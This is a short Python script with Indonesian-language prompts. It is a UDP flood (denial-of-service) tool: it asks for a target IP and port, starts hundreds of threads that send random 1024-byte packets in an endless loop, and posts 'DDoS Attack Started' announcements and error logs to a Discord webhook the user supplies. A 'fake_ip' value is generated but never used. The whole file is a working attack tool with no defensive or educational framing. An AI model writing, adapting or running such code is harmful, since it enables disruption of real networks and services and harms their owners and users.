import socket
import threading
import random
import sys
import requests
import time

target = input("Masukkan IP Target: ")
port = int(input("Masukkan Port Target: "))
thread_count = int(input("Jumlah thread (contoh: 500): "))
discord_webhook = input("Masukkan Discord Webhook URL: ")

def send_to_discord(message):
    try:
        requests.post(discord_webhook, json={"content": message})
    except:
        pass  

def attack():
    while True:
        try:
            fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random.randbytes(1024), (target, port))
        except Exception as e:
            error_msg = f"Error: {str(e)}"
            print(error_msg)
            send_to_discord(error_msg)
            break

send_to_discord(f"🚀 **DDoS Attack Started!**\n- Target: `{target}:{port}`\n- Threads: `{thread_count}`\n- Time: `{time.strftime('%Y-%m-%d %H:%M:%S')}`")

threads = []
for _ in range(thread_count):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    threads.append(thread)
    thread.start()

print("Serangan DDoS dimulai! Log akan dikirim ke Discord jika terjadi error.")
sys.stdin.read()